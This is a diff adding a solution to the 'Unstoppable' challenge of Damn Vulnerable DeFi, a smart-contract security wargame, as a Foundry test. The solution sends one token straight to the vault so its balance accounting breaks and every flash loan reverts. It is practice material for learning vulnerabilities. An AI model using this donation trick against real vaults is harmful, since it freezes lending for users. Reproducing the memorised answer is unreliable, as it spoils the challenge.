@@ -4,7 +4,7 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
-import {UnstoppableVault, Owned} from "../../src/unstoppable/UnstoppableVault.sol";
+import {UnstoppableVault, Owned, IERC3156FlashBorrower} from "../../src/unstoppable/UnstoppableVault.sol";
 import {UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";
 
 contract UnstoppableChallenge is Test {
@@ -91,7 +91,16 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
+        vm.startPrank(player);
         
+        // Break the vault's internal balance accounting
+        token.transfer(address(vault), 1);
+        
+        // Now any flashloan should revert with InvalidBalance
+        vm.expectRevert(UnstoppableVault.InvalidBalance.selector);
+        vault.flashLoan(IERC3156FlashBorrower(address(player)), address(token), 5, "");
+        
+        vm.stopPrank();
     }
 
     /**
